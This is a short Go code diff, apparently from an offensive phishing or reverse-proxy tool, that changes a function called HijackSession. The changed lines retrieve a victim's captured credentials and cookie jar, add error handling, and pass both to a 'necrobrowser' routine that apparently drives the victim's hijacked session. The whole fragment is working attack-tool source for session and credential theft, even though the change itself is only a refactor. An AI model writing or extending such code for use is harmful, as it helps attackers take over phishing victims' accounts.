@@ -488,7 +488,13 @@ func (t *Trace) HijackSession(request *http.Request) (err error) {
 	}
 
 	// Pass credentials
-	creds, err := json.MarshalIndent(victim.Credentials, "", "\t")
+	victimCredentials, err := victim.GetCredentials()
+	if err != nil {
+		t.Error("Unable to retrieve victim: %s credentials. %v", tui.Bold(victim.ID), err)
+		return
+	}
+
+	creds, err := json.MarshalIndent(victimCredentials, "", "\t")
 	if err != nil {
 		t.Warning(err.Error())
 	}
@@ -499,7 +505,13 @@ func (t *Trace) HijackSession(request *http.Request) (err error) {
 	} else {
 		nb, ok := m.(*necrobrowser.Necrobrowser)
 		if ok {
-			go nb.Instrument(victim.Cookies, string(creds))
+			victimCookies, err := victim.GetCookieJar()
+			if err != nil {
+				t.Error("Unable to retrieve victim: %s cookies. %v", tui.Bold(victim.ID), err)
+				return err
+			}
+
+			go nb.Instrument(victimCookies, string(creds))
 		}
 	}
 
